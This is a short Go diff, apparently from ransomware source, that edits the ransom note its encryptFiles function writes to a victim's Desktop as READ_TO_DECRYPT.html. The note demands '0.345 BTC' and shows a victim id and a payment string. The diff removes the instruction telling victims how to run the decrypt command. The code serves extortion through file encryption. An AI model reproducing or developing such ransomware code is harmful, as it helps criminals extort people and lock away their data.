@@ -174,12 +174,9 @@ func encryptFiles() {
 
 		TO RECOVER THE KEY NECESSARY TO DECRYPT YOUR
 		FILES
-
-		AFTER RECOVER YOUR KEY, RUN THE FOLLOWING:
-		%s decrypt yourkeyhere
 		</pre>
 		`
-		content := []byte(fmt.Sprintf(message, keys["id"], "0.345 BTC", "XWpXtxrJpSsRx5dICGjUOwkrhIypJKVr", os.Args[0]))
+		content := []byte(fmt.Sprintf(message, keys["id"], "0.345 BTC", "XWpXtxrJpSsRx5dICGjUOwkrhIypJKVr"))
 
 		// Write the READ_TO_DECRYPT on Desktop
 		ioutil.WriteFile(cmd.BaseDir+"Desktop\\READ_TO_DECRYPT.html", content, 0600)
